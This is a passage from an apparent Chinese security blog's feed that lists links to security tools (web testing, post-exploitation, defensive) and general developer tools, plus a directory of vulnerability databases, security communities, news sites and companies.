href="https://github.com/joelpx/plasma" target="_blank" rel="noopener">Plasma</a><em>针对x86/ARM/MIPS的开源交互式反汇编工具</em></p></li><li><p><a href="http://www.windbg.org/" target="_blank" rel="noopener">WinDbg</a> <em>一款Microsoft Windows上的多用途调试器</em></p></li></ul><h3 id="Web-安全"><a href="#Web-安全" class="headerlink" title="Web 安全"></a>Web 安全</h3><ul><li><p><a href="https://portswigger.net/burp/" target="_blank" rel="noopener">Burpsuite</a> <em> 用于Web应用程序安全测试的集成平台</em></p></li><li><p><a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project" target="_blank" rel="noopener">OWASP ZAP</a> <em>专为Web应用程序设计的渗透测试工具集</em></p></li><li><p><a href="https://wpscan.org/" target="_blank" rel="noopener">WPscan</a> <em>WordPress的黑盒漏洞扫描器</em></p></li><li><p><a href="https://cirt.net/nikto2" target="_blank" rel="noopener">Nikto</a> <em>一款Web应用程序安全扫描器</em></p></li><li><p><a href="https://github.com/andresriancho/w3af" target="_blank" rel="noopener">W3af</a> <em>Web应用程序攻击和评估框架</em></p></li><li><p><a href="http://sqlmap.org/" target="_blank" rel="noopener">SQLmap </a><em>一个开源的自动化SQL注入工具</em></p></li><li><p><a href="https://sourceforge.net/projects/paros/" target="_blank" rel="noopener">Paros</a> <em>基于Java的HTTP / HTTPS代理，用于评估Web应用程序漏洞</em></p></li><li><p><a href="https://www.getpostman.com/" target="_blank" rel="noopener">Postman</a> <em>一款功能超级强大的用于发送HTTP请求的Chrome插件</em></p></li></ul><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><ul><li><p><a href="https://github.com/epinna/weevely3" target="_blank" rel="noopener">Weevely</a> <em>一个专为后期漏洞利用而设计的Web shell</em></p></li><li><p><a href="https://deadbits.github.io/Intersect-2.5/" target="_blank" rel="noopener">Intersec</a><em>一个用Python编写的后期权限利用的框架</em></p></li></ul><h3 id="防御工具"><a href="#防御工具" class="headerlink" title="防御工具"></a>防御工具</h3><ul><li><p><a href="https://www.bro.org/" target="_blank" rel="noopener">Bro</a> <em>一个免费的开源软件网络分析框</em></p></li><li><p><a href="http://dtag-dev-sec.github.io/mediator/feature/2015/03/17/concept.html" target="_blank" rel="noopener">T-Pot</a> <em>一个功能强大的开源多蜜罐平台</em></p></li><li><p><a href="https://www.snort.org/" target="_blank" rel="noopener">Snort</a> <em>一套开源的网络入侵预防与检测软件</em></p></li><li><p><a href="https://www.ossec.net/" target="_blank" rel="noopener">OSSEC</a>  <em>一款开源的多平台的入侵检测系统</em></p></li><li><p><a href="http://www.selinuxproject.org/page/Main_Page" target="_blank" rel="noopener">SELinux</a> <em>Linux内核的安全模组，提供了访问控制安全策略机制</em></p></li><li><p><a href="https://www.netfilter.org/" target="_blank" rel="noopener">Netfilter</a> <em>Linux内核中的一个软件框架，具有NAT及防火墙功能</em></p></li><li><p><a href="https://cuckoosandbox.org/" target="_blank" rel="noopener">Cuckoo</a> <em>一款流行的开源自动恶意软件分析系统</em></p></li><li><p><a href="https://github.com/mozilla/MozDef" target="_blank" rel="noopener">MozDef</a> <em>Mozilla防御平台（MozDef），可实现安全事件处理流程的自动化</em></p></li><li><p><a href="https://www.modsecurity.org/" target="_blank" rel="noopener">ModSecurity</a> <em>一种流行的开源Web应用程序防火墙</em></p></li></ul><h3 id="工具导航"><a href="#工具导航" class="headerlink" title="工具导航"></a>工具导航</h3><ul><li><p><a href="http://sectools.org/" target="_blank" rel="noopener">SecTools</a></p></li><li><p><a href="https://tools.kali.org/" target="_blank" rel="noopener">Kali Tools</a></p></li><li><p><a href="http://seclist.us/" target="_blank" rel="noopener">SecList</a></p></li><li><p><a href="https://tools.pentestbox.org/" target="_blank" rel="noopener">Pentest Box Tools</a></p></li><li><p><a href="https://www.kitploit.com/" target="_blank" rel="noopener">KitPloit</a></p></li><li><p><a href="http://www.toolswatch.org/" target="_blank" rel="noopener">ToolsWatch</a></p></li><li><p><a href="https://blackarch.org/tools.html" target="_blank" rel="noopener">Blackarch Tools</a></p></li><li><p><a href="https://www.t00ls.net/pytools.html" target="_blank" rel="noopener">T00ls Pytools</a></p></li><li><p><a href="https://tools.pediy.com/win/cryptography.htm" target="_blank" rel="noopener">看雪工具集</a></p></li><li><p><a href="https://www.shentoushi.top/network" target="_blank" rel="noopener">渗透师在线工具集</a></p></li><li><p><a href="http://wiki.beysec.com/" target="_blank" rel="noopener">BeySec 开源工具</a></p></li><li><p><a href="https://www.anquanquan.info/#tools" target="_blank" rel="noopener">安全圈 info Tools</a></p></li></ul><hr><h2 id="计算机类"><a href="#计算机类" class="headerlink" title="计算机类"></a>计算机类</h2><h3 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h3><ul><li><p><a href="https://www.vim.org/" target="_blank" rel="noopener">Vim</a> <em>编辑器之神，多模式编辑，强大的组合功能</em></p></li><li><p><a href="https://www.gnu.org/software/emacs/" target="_blank" rel="noopener">Emacs</a> <em>神之编辑器，高度可定制，强大的可扩展性</em></p></li><li><p><a href="https://notepad-plus-plus.org/" target="_blank" rel="noopener">Notepad++</a> <em>免费而优秀，支持超过50种编程，脚本，语言等</em></p></li><li><p><a href="https://atom.io/" title="Atom" target="_blank" rel="noopener">Atom</a> <em>21世纪先进的的开源免费跨平台代码编辑器</em></p></li><li><p><a href="https://code.visualstudio.com/" target="_blank" rel="noopener">VS Code</a> <em>一款免费开源的现代化轻量级多平台代码编辑器</em></p></li><li><p><a href="http://www.sublimetext.com/" target="_blank" rel="noopener">Sublime Text</a> <em>性能强大，特性炫酷，跨平台文本代码编辑器</em></p></li><li><p><a href="https://dillinger.io/" target="_blank" rel="noopener">DILLINGER</a> <em>m一款漂亮强大，支持云端，离线存储Markdown在线编辑器</em></p></li><li><p><a href="https://www.farbox.com/" target="_blank" rel="noopener">FarBox</a> <em>一个支持Markdown写作语法的博客平台，免费，支持多平台</em></p></li><li><p><a href="http://www.markdownpad.com/" target="_blank" rel="noopener">MarkdownPad</a> <em>一款全功能编辑器，windows 平台最好用的markdown编辑器之一</em></p></li></ul><h3 id="编译器"><a href="#编译器" class="headerlink" title="编译器"></a>编译器</h3><ul><li><p><a href="https://gcc.gnu.org/" target="_blank" rel="noopener">GCC</a> <em>Linux平台下最流行最好用的C语言开发工具，没有之一</em></p></li><li><p><a href="https://sourceforge.net/projects/orwelldevcpp/" target="_blank" rel="noopener">Dev-C++</a> <em>一款全功能的C和C++集成开发环境，基本可满足编程需求</em></p></li><li><p><a href="http://www.programarts.com/cfree_ch/" target="_blank" rel="noopener">C-Free</a> <em>一款轻量级支持多种编译器的专业化C/C++集成开发环境（IDE）</em></p></li><li><p><a href="https://code.visualstudio.com/" target="_blank" rel="noopener">VisualStudio</a> <em>一套完整的开发工具集，调试功能强大，但比较占用空间</em></p></li><li><p><a href="http://www.codeblocks.org/" target="_blank" rel="noopener">Code::Blocks</a> <em>开源，跨平台，免费的C，C ++和Fortran IDE</em></p></li><li><p><a href="https://www.eclipse.org/" target="_blank" rel="noopener">Eclipse</a> <em>著名的跨平台开源集成开发环境（IDE）,插件丰富，支持多种语言</em></p></li><li><p><a href="https://ipython.org/" target="_blank" rel="noopener">IPython</a> <em>一款基于Python的交互式解释器，提供更为强大的编辑和交互功能</em></p></li><li><p><a href="http://www.pydev.org/" target="_blank" rel="noopener">Pydev</a> <em>一个运行于eclipse上的开源插件，功能强大，性能高效</em></p></li><li><p><a href="https://www.jetbrains.com/pycharm/" target="_blank" rel="noopener">Pycharm</a> <em>专业的python集成开发环境，支持众多第三方web开发框架</em></p></li><li><p><a href="https://wingware.com/" target="_blank" rel="noopener">WingIDE</a> <em>高效跨平台python集成开发环境，调试功能强大，代码管理灵活(推荐)</em></p></li></ul><h3 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h3><ul><li><p><a href="http://www.sioe.cn/yingyong/yanse-rgb-16/" target="_blank" rel="noopener">颜色转换</a> <em>RGB颜色值与十六进制颜色码转换工具</em></p></li><li><p><a href="https://c.runoob.com/front-end/58" target="_blank" rel="noopener">Front-end</a> <em>在线进制转换器，支持2~36任意进制转换</em></p></li><li><p><a href="https://www.processon.com/" target="_blank" rel="noopener">ProcessOn</a>  <em>免费在线作图，支持流程图，思维导图，UML，网络拓扑图等</em></p></li><li><p><a href="https://smallpdf.com/" target="_blank" rel="noopener">Smallpdf</a> <em>解决PDF转换问题的免费在线工具(PDF，Word,JPG,PPT免费相互转换)</em></p></li><li><p><a href="https://www.onlinedoctranslator.com/zh-CN/translationform" target="_blank" rel="noopener">DocTranslator</a> <em>免费的在线文档翻译器，一键翻译，支持格式转换</em></p></li><li><p><a href="http://www.iconfont.cn/" target="_blank" rel="noopener">Iconfont</a> <em>阿里巴巴矢量图标库，功能强大，图标内容丰富</em></p></li><li><p><a href="http://fontawesome.dashgame.com/" target="_blank" rel="noopener">Font Awesome</a> <em>一套绝佳的图标字体库和CSS框架，Next默认矢量图标</em></p></li></ul><h3 id="问答社区"><a href="#问答社区" class="headerlink" title="问答社区"></a>问答社区</h3><ul><li><p><a href="https://stackexchange.com/" target="_blank" rel="noopener">StackExchange.com/</a> <em>一系列问答网站，每一个网站包含不同领域的问题</em></p></li><li><p><a href="https://www.quora.com/" target="_blank" rel="noopener">Quora</a> <em>一个在线知识市场，集合许多问题和答案，容许用户协同编辑问题和答案</em></p></li><li><p><a href="https://stackoverflow.com/" target="_blank" rel="noopener">Stackoverflow</a> <em>StackExchange最活跃的一个子站，专专注于程序设计领域的问答网站</em></p></li><li><p><a href="https://segmentfault.com/" target="_blank" rel="noopener">Segmentfault</a> <em>国内领先的开发者技术社区，为编程爱好者提供一个纯粹、高质的技术交流的平台</em></p></li></ul><h3 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h3><ul><li><p><a href="https://git-scm.com/" target="_blank" rel="noopener">Git</a> <em>一个开源的分布式版本控制系统，善于保存文本文档，可在本地提交与管理(git版本库)</em></p></li><li><p><a href="https://subversion.apache.org/" target="_blank" rel="noopener">SVN</a> <em>一种集中式文件版本管理系统，采用分支管理系统，所有的版本信息都放在服务器上</em></p></li><li><p><a href="https://www.astro.princeton.edu/~rhl/cvs/cvs.html" target="_blank" rel="noopener">CVS</a> <em>开发源码的并发版本系统，代码统一管理，跨平台，完善的冲突解决方案</em></p></li></ul><h3 id="博客平台"><a href="#博客平台" class="headerlink" title="博客平台"></a>博客平台</h3><ul><li><p><a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">Hexo</a> <em>快速、简洁且高效的静态博客框架，支持Markdown语法，个人推荐</em></p></li><li><p><a href="https://jekyllrb.com/" target="_blank" rel="noopener">Jekyll</a> <em>流行的静态页面生成器，简约高效，专注于内容，Github Pages默认使用</em></p></li><li><p><a href="http://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <em>世界上最快的开源静态站点生成器之一，速度惊人，灵活性强，中文资料匮乏</em></p></li><li><p><a href="https://ghost.org/" target="_blank" rel="noopener">Ghost</a> <em>精简版动态博客平台，拥有admin页面，速度一般，MD支持不是很完善</em></p></li><li><p><a href="https://cn.wordpress.org/" target="_blank" rel="noopener">Wordpress</a> <em>使用最广泛的动态博客平台，功能强大，插件丰富，可定制性强，适合大型网站</em></p></li><li><p><a href="http://typecho.org/" target="_blank" rel="noopener">typecho</a> <em>一款国产轻量级博客，轻量高效，先进稳定，专注内容，追求简洁</em></p></li><li><p><a href="https://www.emlog.net/" target="_blank" rel="noopener">emlog</a> <em>国内一款基于PHP和MySQL的功能强大的博客及CMS建站系统，小巧灵活，追求细节</em></p></li><li><p><a href="https://www.leavesongs.com/THINK/about-talkbook.html" target="_blank" rel="noopener">Talkbook</a> <em>一款来自某牛的轻量级静态博客，功能完善，性能强大，部署简易，未开源，有待研究</em></p></li></ul><h3 id="托管平台"><a href="#托管平台" class="headerlink" title="托管平台"></a>托管平台</h3><ul><li><p><a href="https://github.com/" target="_blank" rel="noopener">Github</a> <em>Git + Hub，开源项目的聚集地，程序员的另类简历，私有仓库收费</em></p></li><li><p><a href="https://link.jianshu.com/?t=https://gitlab.com" target="_blank" rel="noopener">Gitlab</a> <em>开源的版本管理系，比较适合企业使用，个人可创建免费的私有仓库</em></p></li><li><p><a href="https://sourceforge.net/" target="_blank" rel="noopener">SourceForge</a> <em>曾经辉煌的开源软件平台，为全球超过3300万用户创建，协作和分发</em></p></li><li><p><a href="https://opensource.google.com/" target="_blank" rel="noopener">Opensource</a> <em>Google 的新开源网站，汇集了 2000 多个开源项目，几千万行代码</em></p></li><li><p><a href="https://bitbucket.org/" target="_blank" rel="noopener">BitBucket</a> <em>支持Mercurial和Git的代码托管网站,提供免费帐户</em></p></li><li><p><a href="http://www.springloops.io" target="_blank" rel="noopener">Springloops</a> <em>一个带有Git和SVN的版本控制软件，支持个人与团队商业使用</em></p></li><li><p><a href="https://gitee.com/" target="_blank" rel="noopener">码云</a> <em>国内最大的开源社区 OSChina 的代码托管平台，提供团队协作开发</em></p></li><li><p><a href="https://coding.net/" target="_blank" rel="noopener">Coding</a> <em>码市,国内首个一站式云端软件服务平台，云端软件开发协作平台</em></p></li><li><p><a href="https://code.aliyun.com/explore" target="_blank" rel="noopener">阿里云 Code</a> <em>依托于阿里云，注册阿里云账号可免费托管代码，精品平台</em></p></li></ul><h3 id="语言-框架"><a href="#语言-框架" class="headerlink" title="语言/框架"></a>语言/框架</h3><ul><li><p><a href="https://golang.org/" target="_blank" rel="noopener">Go</a> <em>云时代的C语言，静态强类型、编译型、并发型，具有垃圾回收功能</em></p></li><li><p><a href="https://www.r-project.org/" target="_blank" rel="noopener">R</a> <em>一种用于统计分析、绘图、数据挖掘的自由软件编程语言与操作环境</em></p></li><li><p><a href="https://www.lua.org/" target="_blank" rel="noopener">Lua</a> <em>一种嵌入式动态语言，简洁、轻量、可扩展，配置性、可扩展性强</em></p></li><li><p><a href="https://julialang.org/" target="_blank" rel="noopener">Julia</a> <em>一个面向科学计算的高性能动态高级程序设计语言，交互式，轻量级，性能综合</em></p></li><li><p><a href="https://nodejs.org/zh-cn/" target="_blank" rel="noopener">Node.js</a> <em>一个能够在服务器端运行JavaScript的开放源代码、跨平台JavaScript 运行环境</em></p></li><li><p><a href="https://www.djangoproject.com/" target="_blank" rel="noopener">Django</a> <em>最有代表性的Python框架，遵循MMVC架构模式，内置模板引擎，安装简易，社区支持良好</em></p></li><li><p><a href="http://flask.pocoo.org/" target="_blank" rel="noopener">Flask</a> <em>基于WerkzeugWSGI工具箱和jinja模板，使用BSD许可证，适合开发轻量级的Web应用</em></p></li><li><p><a href="http://www.web2py.com/" target="_blank" rel="noopener">Web2py</a> <em>开源框架，允许开发者快速创建动态交互式的网站，容易使用，安全性较好</em></p></li><li><p><a href="https://docs.spring.io/spring/docs/current/spring-framework-reference/web.html" target="_blank" rel="noopener">Spring MVC</a> <em>Java主流开发框架，提供一个用于 Web 应用程序开发的强大工具集</em></p></li><li><p><a href="https://struts.apache.org/" target="_blank" rel="noopener">Struts 2</a> <em>作为控制器(Controller)来建立模型与视图的数据交互，采用拦截器机制处理用户请求</em></p></li><li><p><a href="http://www.oracle.com/technetwork/java/javaee/javaserverfaces-139869.html" target="_blank" rel="noopener">JSF</a> <em>一种用于构建 Web 应用程序的新标准Java框架，提供以组件为中心的开发方法，简单强大</em></p></li></ul><h3 id="虚拟化-云"><a href="#虚拟化-云" class="headerlink" title="虚拟化/云"></a>虚拟化/云</h3><ul><li><p><a href="https://www.linux-kvm.org/page/Main_Page" target="_blank" rel="noopener">KVM </a> <em>集成到Linux内核的Hypervisor，Linux全虚拟化解决方案</em></p></li><li><p><a href="https://xenserver.org/" target="_blank" rel="noopener">Xen</a> <em>运行在裸机上的虚拟化管理程序(Hypervisor)，支持全虚拟化和准虚拟化</em></p></li><li><p><a href="https://www.docker.com/" target="_blank" rel="noopener">Docker</a> <em>一种容器技术，属于一种轻量级虚拟化技术</em></p></li><li><p><a href="https://www.veeam.com/blog/what-is-hyper-v-technology.html" target="_blank" rel="noopener">Hyper-V</a> <em>微软提出的一种系统管理程序虚拟化技术，能够实现桌面虚拟化</em></p></li><li><p><a href="https://www.vmware.com/" target="_blank" rel="noopener">WMware</a> <em>第一个商业化的成功的虚拟化的x86架构</em></p></li><li><p><a href="https://www.openstack.org/" target="_blank" rel="noopener">Openstack </a><em>基于linux的IaaS层解决方案(支持多种虚拟化技术）</em></p></li><li><p><a href="https://cloudstack.apache.org/" target="_blank" rel="noopener">CloudStack</a> <em>使用java开发的基于linux的IaaS层解决方案</em></p></li></ul><h3 id="类Unix系统"><a href="#类Unix系统" class="headerlink" title="类Unix系统"></a>类Unix系统</h3><ul><li><p><a href="https://www.freebsd.org/where.html" target="_blank" rel="noopener">FreeBSD</a> <em>一个自由和开放源码的类Unix操作系统，性能稳定，适合科学研究</em></p></li><li><p><a href="https://getfedora.org/zh_CN/" target="_blank" rel="noopener">Fedora</a> <em>基于Red Hat,一款由社区支持的新颖、多功能，开源自由的操作系统</em></p></li><li><p><a href="https://www.centos.org/" target="_blank" rel="noopener">CentOS</a> <em>基于Red Hat的免费Linux发行版，性能稳定高效，适合服务器</em></p></li><li><p><a href="https://www.ubuntu.com/" target="_blank" rel="noopener">Ubuntu</a> <em>一款基于Debian派生的操作系统，适合做桌面系统的Linux发行版本</em></p></li></ul><h3 id="Web服务器"><a href="#Web服务器" class="headerlink" title="Web服务器"></a>Web服务器</h3><ul><li><p><a href="http://www.apache.org/" target="_blank" rel="noopener">Apache</a> <em>源代码开放，跨平台，可移植，模块支持丰富，重量级主流Web服务器</em></p></li><li><p><a href="https://www.nginx.com/" target="_blank" rel="noopener">Nginx</a> <em>一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并发能力强</em></p></li><li><p><a href="http://tomcat.apache.org/" target="_blank" rel="noopener">Tomcat</a> <em>一个开放源代码、运行servlet和JSP Web应用软件的基于Java的W eb应用软件容器</em></p></li><li><p><a href="https://www.iis.net/" target="_blank" rel="noopener">Microsoft IIS</a> <em>一种允许在公共Intranet或Internet上发布信息的Web服务器，又称为Internet服务管理器</em></p></li><li><p><a href="https://www.lighttpd.net/" target="_blank" rel="noopener">Lighttpd</a> <em>提供一个专门针对高性能网站，安全、快速、兼容性好并且灵活的Web  Server环境，轻量级</em></p></li></ul><h3 id="分布式系统"><a href="#分布式系统" class="headerlink" title="分布式系统"></a>分布式系统</h3><ul><li><p><a href="http://hadoop.apache.org/" target="_blank" rel="noopener">Hadoop</a> <em>三大主流分布式计算系统之一，使用硬盘存储数据，适用于离线的复杂的大数据处理</em></p></li><li><p><a href="https://spark.apache.org/" target="_blank" rel="noopener">Spark</a> <em>三大主流分布式计算系统之一，使用内存来存储数据，适用于离线的快速的大数据处理</em></p></li><li><p><a href="http://storm.apache.org/" target="_blank" rel="noopener">Storm</a> <em>三大主流分布式计算系统之一，提供实时运算的特性，适用于在线实时大数据处理</em></p></li></ul><h3 id="深度学习框架"><a href="#深度学习框架" class="headerlink" title="深度学习框架"></a>深度学习框架</h3><ul><li><p><a href="https://www.tensorflow.org/" target="_blank" rel="noopener">TensorFlow</a> <em>一个使用数据流图，流行的开放源代码机器学习框架，偏重底层，代码开发要求高</em></p></li><li><p><a href="https://keras.io/" target="_blank" rel="noopener">Keras</a> <em>一个用Python编写的深度学习库，句法明晰，文档新颖，简单高效，能够快速实现实验</em></p></li><li><p><a href="http://caffe.berkeleyvision.org/" target="_blank" rel="noopener">Caffe</a> <em>老牌中的老牌，具有非常好的通用性，快速稳健，但不够灵活，可定制性差，安装依赖性强</em></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;参考网络上的资源，整理的一些安全与计算机类&lt;a href=&quot;https://firehacker.top/tools/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Tools&lt;/a&gt;，SecTools 涉及渗透平台及框架，漏洞扫描与利用，信息收集，网络分析，密码攻击，逆向工程，安全防御等；计算机类工具包括主流代码编辑器/编译器，问答社区，开源社区，博客平台，分布式系统，深度学习框架等&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="0x04 拓展梳理" scheme="http://www.firehacker.top/categories/0x04-%E6%8B%93%E5%B1%95%E6%A2%B3%E7%90%86/"/>
    
      <category term="资源导航" scheme="http://www.firehacker.top/categories/0x04-%E6%8B%93%E5%B1%95%E6%A2%B3%E7%90%86/%E8%B5%84%E6%BA%90%E5%AF%BC%E8%88%AA/"/>
    
    
  </entry>
  
  <entry>
    <title>安全站点导航</title>
    <link href="http://www.firehacker.top/2018/08/24/%E5%AE%89%E5%85%A8%E7%AB%99%E7%82%B9%E5%AF%BC%E8%88%AA/"/>
    <id>http://www.firehacker.top/2018/08/24/安全站点导航/</id>
    <published>2018-08-24T03:15:44.000Z</published>
    <updated>2018-08-24T04:16:24.579Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>参考网络上的资源，整理的一些安全<a href="https://firehacker.top/community/" target="_blank" rel="noopener">社区</a>站点，涉及常见漏洞发布平台，白帽黑客社区，安全资讯网站，以及部分新兴安全企业<br><a id="more"></a></p></blockquote><hr><h3 id="漏洞平台"><a href="#漏洞平台" class="headerlink" title="漏洞平台"></a>漏洞平台</h3><ul><li><p><a href="http://cve.mitre.org/" target="_blank" rel="noopener">CVE</a> <em>通用漏洞披露，全球漏洞列表</em></p></li><li><p><a href="http://cwe.mitre.org/" target="_blank" rel="noopener">CWE</a> <em>常见软件安全弱点列表</em></p></li><li><p><a href="https://nvd.nist.gov/" target="_blank" rel="noopener">NVD</a> <em>美国国家漏洞数据库</em></p></li></ul><ul><li><p><a href="http://www.cnnvd.org.cn/" target="_blank" rel="noopener">CNNVD</a> <em>国家信息安漏洞库</em></p></li><li><p><a href="http://www.cnvd.org.cn/" target="_blank" rel="noopener">CNVD</a> <em>国家信息安全漏洞共享平台</em></p></li><li><p><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">Exploit-db</a>  <em>攻击性安全漏洞数据库</em></p></li><li><p><a href="http://www.expku.com/" target="_blank" rel="noopener">Expku</a> <em>中文漏洞利用数据库</em></p></li><li><p><a href="https://www.securityfocus.com/" target="_blank" rel="noopener">SecurityFocus</a> <em>专注安全焦点与漏洞</em></p></li><li><p><a href="https://seebug.org" target="_blank" rel="noopener">Seebug</a>  <em>洞悉漏洞，知道创宇漏洞平台</em></p></li><li><p><a href="http://www.0daybank.org/" target="_blank" rel="noopener">0dayBank</a> <em>全球互联网漏洞公开发布网站</em></p></li><li><p><a href="http://wooyun.shentoushi.top/index.php" target="_blank" rel="noopener">WooYun</a> <em>前乌云历史漏洞列表</em></p></li><li><p><a href="https://butian.360.cn/" target="_blank" rel="noopener">补天漏洞</a> <em>漏洞检测与响应平台</em></p></li><li><p><a href="https://www.vulbox.com/" target="_blank" rel="noopener">漏洞盒子</a> <em>互联网安全测试众测平台</em></p></li></ul><h3 id="白帽社区"><a href="#白帽社区" class="headerlink" title="白帽社区"></a>白帽社区</h3><ul><li><p><a href="http://www.blackhat.com/" target="_blank" rel="noopener">Blackhat</a> <em>黑帽大会，汇集全球顶级黑客</em></p></li><li><p><a href="https://www.defcon.org/" target="_blank" rel="noopener">Defcon</a> <em>全球最大计算机安全会议之一</em></p></li><li><p><a href="https://xz.aliyun.com/" target="_blank" rel="noopener">先知社区</a> <em>全球互联网前沿安全技术社区</em></p></li><li><p><a href="https://wiki.ioin.in/" target="_blank" rel="noopener">Sec-News</a><em>分享安全文章，共同成长的白帽平台</em></p></li><li><p><a href="https://www.t00ls.net/" title="低调专业的安全技术交流平台" target="_blank" rel="noopener">Tools</a> <em>低调专业的安全技术交流平台</em></p></li><li><p><a href="https://bbs.pediy.com/" target="_blank" rel="noopener">看雪论坛</a> <em>致力于安全研究的开发者社区</em></p></li><li><p><a href="http://zone.secbug.net/" target="_blank" rel="noopener">乌云社区</a> <em>白帽技术社区，内测版</em></p></li></ul><h3 id="安全资讯"><a href="#安全资讯" class="headerlink" title="安全资讯"></a>安全资讯</h3><ul><li><p><a href="https://securityintelligence.com/" target="_blank" rel="noopener">SecInte</a> <em>信息安全的分析与洞察</em></p></li><li><p><a href="https://securelist.com/" target="_blank" rel="noopener">Securelist</a> <em>网络威胁研究与报告</em></p></li><li><p><a href="http://www.freebuf.com/" title="Freebuf" target="_blank" rel="noopener">Freebuf</a>  <em>互联网安全新媒体</em></p></li><li><p><a href="https://www.secpulse.com/" target="_blank" rel="noopener">安全脉搏</a> <em>分享技术，悦享品质</em></p></li><li><p><a href="https://www.anquanke.com/" target="_blank" rel="noopener">安全客</a> <em>有思想的安全资讯平台</em></p></li><li><p><a href="https://www.aqniu.com/" target="_blank" rel="noopener">安全牛</a> <em>全面的安全信息网</em></p></li><li><p><a href="https://www.secrss.com/" target="_blank" rel="noopener">安全内参</a> <em>网络安全首席知识官</em></p></li><li><p><a href="https://www.sec-wiki.com/index.php" target="_blank" rel="noopener">SecWiki</a> <em>国内外安全资讯及技术汇聚地</em></p></li></ul><h3 id="安全博客"><a href="#安全博客" class="headerlink" title="安全博客"></a>安全博客</h3><ul><li><p><a href="http://blog.nsfocus.net/" target="_blank" rel="noopener">Nsfocus</a> <em>绿盟科技博客，巨人背后的安全专家</em></p></li><li><p><a href="http://blogs.360.cn/" title="360技术博客" target="_blank" rel="noopener">360-Blogs</a> <em>分享360技术，与安全的互联网共同成长</em></p></li><li><p><a href="http://blog.knownsec.com/" target="_blank" rel="noopener">KnownSec</a> <em>知道创宇博客，做更好更安全的互联网</em></p></li><li><p><a href="https://blog.chaitin.cn/" target="_blank" rel="noopener">CHAITIN</a> <em>长亭科技博客，专注于下一代应用安全</em></p></li><li><p><a href="http://blog.topsec.com.cn/" target="_blank" rel="noopener">Topsec</a> <em>天融信阿尔法实验室，可信网络安全世界</em></p></li><li><p><a href="http://www.polaris-lab.com/" target="_blank" rel="noopener">Polaris-lab</a> <em>勾陈之象 实名麒麟 位居中央 权司戊日</em></p></li><li><p><a href="https://paper.seebug.org/" target="_blank" rel="noopener">Paper</a> <em>汇聚黑客智慧，包罗安全技术精粹</em></p></li><li><p><a href="http://liehu.tass.com.cn/" target="_blank" rel="noopener">猎户攻防</a> <em>猎户攻防实验室，专注于安全攻防技术研究</em></p></li><li><p><a href="https://ipot.sec-wiki.com/" target="_blank" rel="noopener">蜜罐小组</a> <em>一个专注于蜜罐技术研究与交流的小站</em></p></li></ul><h3 id="新兴企业"><a href="#新兴企业" class="headerlink" title="新兴企业"></a>新兴企业</h3><ul><li><p><a href="https://qingteng.cn/" target="_blank" rel="noopener">青藤云</a> <em>以不变应万变，专注自适应安全架构(ASA)</em></p></li><li><p><a href="http://www.hansight.com/" target="_blank" rel="noopener">瀚思科技</a> <em>专注于大数据安全分析，引领”AI+安全”</em></p></li><li><p><a href="http://www.lanysec.com/" target="_blank" rel="noopener">兰云科技</a> <em>主推SOAPA架构，专注于大数据安全</em></p></li><li><p><a href="https://www.geetest.com/" target="_blank" rel="noopener">极验验证</a> <em>专注于智能人机验证的初创公司</em></p></li><li><p><a href="http://www.dynarose.com/" target="_blank" rel="noopener">蔷薇灵动</a> <em>专注于微隔离技术的初创公司</em></p></li><li><p><a href="http://www.trusfort.com/" target="_blank" rel="noopener">芯盾时代</a> <em>专注于生物识别与行为认证技术</em></p></li><li><p><a href="https://www.moresec.cn/index.html" target="_blank" rel="noopener">默安科技</a> <em>专注于云安全，首推欺骗防御理念</em></p></li><li><p><a href="http://www.peersafe.com/" target="_blank" rel="noopener">众享比特</a> <em>专注于分布式网络与区块链安全</em></p></li><li><p><a href="http://shuziguanxing.com/" target="_blank" rel="noopener">数字观星</a> <em>基于威胁情报的SaaS化安全运营平台</em></p></li><li><p><a href="https://www.bangcle.com/" target="_blank" rel="noopener">梆梆安全</a> <em>专注于移动安全，保护智能生活</em></p></li><li><p><a href="https://www.hillstonenet.com.cn/" target="_blank" rel="noopener">山石网科</a> <em>专注下一代网络边界安全防御</em></p></li></ul><h3 id="站点导航"><a href="#站点导航" class="headerlink" title="站点导航"></a>站点导航</h3><ul><li><p><a href="https://www.anquanquan.info/" target="_blank" rel="noopener">安全圈</a> <em>做接地气的信息安全导航</em></p></li><li><p><a href="https://www.t00ls.net/navi.html" target="_blank" rel="noopener">T00ls</a> <em>比较全面的安全站点导航</em></p></li><li><p><a href="https://www.shentoushi.top/" target="_blank" rel="noopener">渗透师</a> <em>网络安全从业者安全导航</em></p></li><li><p><a href="https://navisec.it/" target="_blank" rel="noopener">NaviSec</a> <em>纳威，网络安全上网导航</em></p></li><li><p><a href="http://www.hackjie.com/" target="_blank" rel="noopener">黑客街</a> <em>网络安全爱好者的安全导航</em></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;参考网络上的资源，整理的一些安全&lt;a href=&quot;https://firehacker.top/community/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;社区&lt;/a&gt;站点，涉及常见漏洞发布平台，白帽黑客社区，安全资讯网站，以及部分新兴安全企业&lt;br&gt;
    
    </summary>
    
      <category term="0x04 拓展梳理" scheme="http://www.firehacker.top/categories/0x04-%E6%8B%93%E5%B1%95%E6%A2%B3%E7%90%86/"/>
    
      <category term="资源导航" scheme="http://www.firehacker.top/categories/0x04-%E6%8B%93%E5%B1%95%E6%A2%B3%E7%90%86/%E8%B5%84%E6%BA%90%E5%AF%BC%E8%88%AA/"/>
    
    
  </entry>
  
  <entry>
    <title>大数据+AI+云+IOT技术浅析</title>
